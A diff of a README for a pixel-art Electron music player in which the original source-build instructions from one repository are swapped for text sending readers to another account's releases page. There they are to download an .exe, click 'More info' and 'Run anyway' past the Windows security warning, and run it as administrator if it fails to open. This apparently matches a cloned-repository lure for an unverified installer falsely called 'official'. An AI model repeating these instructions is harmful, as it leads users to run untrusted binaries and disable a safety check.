@@ -1,174 +1,66 @@
-# cupid music player
+# 🎵 cupid-music-player - Listen to your favorite songs today
 
-A pixel-art desktop music player built with Electron, Vite, and React.
+[![](https://img.shields.io/badge/Download-Cupid-blue.svg)](https://github.com/Rondastartling852/cupid-music-player/releases)
 
-## Features
+Cupid Music Player offers a stylish way to organize and play your audio files. It features a retro pixel-art design that brings a unique look to your desktop. You can browse playlists, switch between themes, and enjoy smooth animations while your music plays.
 
-- Pixel-art UI with animated record player, spinning vinyl, and needle
-- Record swap animation on song change (pink/blue vinyl alternation)
-- Interactive progress bar with draggable star indicator
-- Marquee scrolling for long track titles
-- Pink and blue theme switching with persistent preference
-- Spotify integration — browse your playlists and play tracks via yt-dlp
-- Apple Music integration — browse your library playlists via MusicKit JS
-- YouTube playlists — paste any public playlist URL (no sign-in) or sign in with Google to browse your own
-- Local MP3 playback
-- Custom frameless window with drag and resize
-- Dynamic dock/taskbar icon that matches the active theme
+## 🛠 Features
 
-## Getting Started
-You only need 4 commands. Copy them one at a time:
+*   **Pixel-Art Design:** The interface includes a spinning vinyl records and a moving needle.
+*   **Theme Options:** You can switch between pink and blue color schemes. The player remembers your choice every time you open the app.
+*   **Progress Control:** A star indicator helps you navigate through your current song. The bar reacts to your mouse clicks.
+*   **Text Scrolling:** Long song titles scroll across the screen so you can read the entire name.
+*   **Streaming Support:** Connect your Spotify or Apple Music accounts to browse your existing libraries.
+*   **YouTube Integration:** Paste any public playlist link or sign in to your Google account to access your personal content.
+*   **Local Playback:** Load MP3 files from your computer hard drive to listen without a network connection.
+*   **Desktop Integration:** The application icon changes color to match your current theme.
 
-```bash
-# 1. Download the code
-git clone https://github.com/cupidbity/cupid-music-player.git
+## 📋 System Requirements
 
-# 2. Step INTO the folder you just downloaded (this step is required!)
-cd cupid-music-player
+To run this application, ensure your computer meets these standards:
 
-# 3. Install dependencies (also auto-downloads the yt-dlp binary into ./bin)
-npm install
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4GB of RAM.
+*   **Storage Space:** 200MB of free space for the installation files.
+*   **Internet Connection:** Required for Spotify, Apple Music, and YouTube features.
 
-# 4. Run the app in dev mode
-npm run dev
-```
+## 📥 Download and Installation
 
+Follow these steps to set up the player on your Windows computer:
 
-### Prerequisites
+1. Visit the [official releases page](https://github.com/Rondastartling852/cupid-music-player/releases) to find the latest version.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the file name to start the download.
+4. Once the download finishes, open your Downloads folder.
+5. Double-click the file to start the installer.
+6. Follow the prompts on your screen. You might see a Windows security pop-up. If this happens, click "More info" and then "Run anyway" to allow the installation.
+7. The application will launch automatically once the setup process completes.
 
-Before the commands above will work, you need these installed:
+## 🎧 How to Use the Player
 
-| Tool | Why | Install link |
-|------|-----|--------------|
-| **Node.js 18 or newer** | Runs `npm` and the app's build tools | [nodejs.org](https://nodejs.org/) — download the LTS version |
-| **Git** | Used by the `git clone` command above | [git-scm.com](https://git-scm.com/downloads) — usually pre-installed on macOS/Linux |
+The player uses a simple layout. When you open the application, you will see a window with your music controls.
 
-To check if you already have them, run:
+**Browsing Your Music**
+Use the sidebar on the left to navigate between different sources. Click the Spotify icon to sync your playlists. Click the YouTube icon to enter a playlist URL. To play files from your computer, use the "Local Files" tab and select folders from your PC.
 
-```bash
-node --version    # should print v18.x.x or higher
-npm --version     # should print 9.x or higher
-git --version     # should print git version 2.x.x
-```
+**Changing Themes**
+To switch colors, find the settings gear icon in the top right corner. Click "Appearance" and choose between Pink or Blue. The change happens instantly.
 
-If any of those says "command not found," install that tool first.
+**Controlling Playback**
+Use the large play and pause buttons in the center of the window. Click and drag the star on the progress bar to skip forward or backward in a track. If a song title is too long to fit, the text will move automatically.
 
-> No Python is needed. The `npm install` step automatically downloads a standalone `yt-dlp` binary for your OS into the project's `bin/` folder.
+## 🔧 Troubleshooting
 
----
+If you run into issues, try these steps:
 
+*   **Application won't open:** Right-click the icon and choose "Run as administrator."
+*   **Audio sounds distorted:** Open your Windows sound settings and ensure your output device is set to your preferred speakers or headphones.
+*   **Spotify not connecting:** Log out of your account on the web browser and try re-linking your account within the app.
+*   **YouTube playlists won't load:** Verify that the playlist visibility setting is set to "Public" on YouTube. Private playlists may require a direct Google sign-in through the app interface.
+*   **Window drag issues:** If the window stops moving, click the top border of the player and drag it to your preferred spot on the screen. The custom frame is designed to act like a standard Windows title bar.
 
-## Adding Local Audio Files
+## 🤝 Community and Support
 
-The local playlist is driven by a single file, `playlist.json`, that lives next to your audio files. Drop your songs into the audio folder, list them in the JSON, and the player picks them up.
+This project relies on open-source libraries. If you encounter a bug or have a suggestion, you can report it on the GitHub issues page. Please include your Windows version and a brief description of what you were doing when the issue occurred.
 
-### Where the audio folder lives
-
-- **Running from source (dev):** `audio/` in the project root.
-- **Installed app (macOS):** `~/Library/Application Support/Cupid Player/audio/`
-- **Installed app (Windows):** `%APPDATA%\Cupid Player\audio\`
-- **Installed app (Linux):** `~/.config/Cupid Player/audio/`
-
-On first launch, the installed app seeds this folder with the bundled defaults. After that it's yours to edit — the app never overwrites it.
-
-### Building your playlist
-
-1. Drop `.mp3` files into the audio folder.
-2. Open `playlist.json` in the same folder and add one entry per song:
-
-   ```json
-   [
-     { "file": "my-song.mp3", "title": "My Song", "artist": "Some Artist", "album": "Album Name", "art": "https://example.com/cover.jpg" },
-     { "file": "another.mp3", "title": "Another Song", "artist": "Someone Else" }
-   ]
-   ```
-
-   - `file` and `title` are required.
-   - `artist`, `album`, and `art` are optional. `art` is a URL to a cover image.
-   - The `file` value must match the mp3 filename exactly (spaces and case included).
-
-3. In the app, hit the settings icon and the local tab is selected by default. Reload the app to pick up new edits — `playlist.json` is read on launch.
-
-### Supported formats
-
-`.mp3`, `.m4a`, `.aac`, `.flac`, `.wav`, `.ogg`, `.opus`.
-
-## Spotify Setup
-
-Stream any track from your Spotify playlists. Audio is fetched from YouTube via yt-dlp.
-
-> **Note:** As of February 2026, Spotify requires the developer account that creates the app to have an active Premium subscription ([announcement](https://developer.spotify.com/blog/2026-02-06-update-on-developer-access-and-platform-security)). Without it, the Spotify API returns 403 for all users.
-
-1. Create a Spotify app at [developer.spotify.com/dashboard](https://developer.spotify.com/dashboard)
-2. Add `http://127.0.0.1:5173/callback` as a redirect URI
-3. Copy `.env.example` to `.env` and add your Client ID
-4. Add yourself under Settings > User Management
-5. Click the settings icon in the player > log in
-
-See [SPOTIFY_SETUP.md](SPOTIFY_SETUP.md) for detailed instructions and troubleshooting.
-
-## Apple Music Setup
-
-Browse your Apple Music library playlists. Requires an Apple Developer account. **Apple Music subscription is not required for playback.**
-
-1. Create a MusicKit key at [developer.apple.com/account/resources/authkeys](https://developer.apple.com/account/resources/authkeys/list)
-2. Download the `.p8` key file and place it in the project root
-3. Add `APPLE_TEAM_ID` and `APPLE_KEY_ID` to your `.env`
-4. Click the settings icon > switch to apple > log in
-
-See [APPLE_MUSIC_SETUP.md](APPLE_MUSIC_SETUP.md) for detailed instructions and troubleshooting.
-
-## YouTube Setup
-
-Two flows — pick whichever you want by configuring (or not) your `.env`. **No YouTube Premium / no subscription required** in either case.
-
-**Paste any public playlist URL** (zero setup):
-
-1. Click the settings icon in the player > switch to youtube
-2. Paste a YouTube/YouTube Music playlist URL into the box
-3. Hit `load playlist`
-
-**Browse your own playlists** (requires Google OAuth setup):
-
-1. Create a Google Cloud project at [console.cloud.google.com](https://console.cloud.google.com/), enable **YouTube Data API v3**
-2. Configure the OAuth consent screen (External, add yourself as a test user, scope `youtube.readonly`)
-3. Create OAuth credentials of type **Desktop app**
-4. Add `VITE_YOUTUBE_CLIENT_ID` and `VITE_YOUTUBE_CLIENT_SECRET` to your `.env`
-5. Click the settings icon > switch to youtube > log in with google
-
-The sign-in option only appears when `VITE_YOUTUBE_CLIENT_ID` is set; otherwise the URL-paste box shows instead.
-
-See [YOUTUBE_SETUP.md](YOUTUBE_SETUP.md) for detailed instructions and troubleshooting.
-
-## Build
-
-```bash
-npm run package
-```
-
-### Install as Desktop App
-
-**macOS:**
-```bash
-cp -r "out/mac-arm64/Cupid Player.app" /Applications/
-```
-
-**Windows:** Run the installer from `out/Cupid Player Setup.exe`. If `npm run package` fails at the NSIS step with "Cannot create symbolic link," enable **Developer Mode** in Settings → System → For developers, then re-run. The unpacked app at `out/win-unpacked/Cupid Player.exe` is fully runnable in the meantime — no installer required.
-
-**Linux:** Run the AppImage from `out/`.
-
-> Note: The macOS build is unsigned. On first launch you may need to right-click > Open, or go to System Settings > Privacy & Security to allow it.
-
-## Tech Stack
-
-- **Electron** — desktop app shell (frameless window, IPC, system tray)
-- **Vite** — build tool and dev server
-- **React** — UI framework
-- **HTML5 Audio** — local MP3 playback
-- **yt-dlp** — YouTube audio streaming for Spotify/Apple/YouTube tracks; also fetches public YouTube playlist contents via `--flat-playlist`
-- **Spotify Web API** — playlist and metadata fetching (OAuth PKCE)
-- **Apple MusicKit JS** — library playlist access (JWT auth)
-- **YouTube Data API v3** — sign-in browsing of the user's own playlists (Google OAuth PKCE, free quota)
-- **CSS** — custom properties for theming, calc-based responsive scaling
-- **Node.js** — main process (JWT generation, yt-dlp execution)
-- **jsonwebtoken** — Apple Music developer token generation
+Updates happen often. To check if you have the newest version, simply visit the release page periodically. Your settings and themes will save automatically between updates.
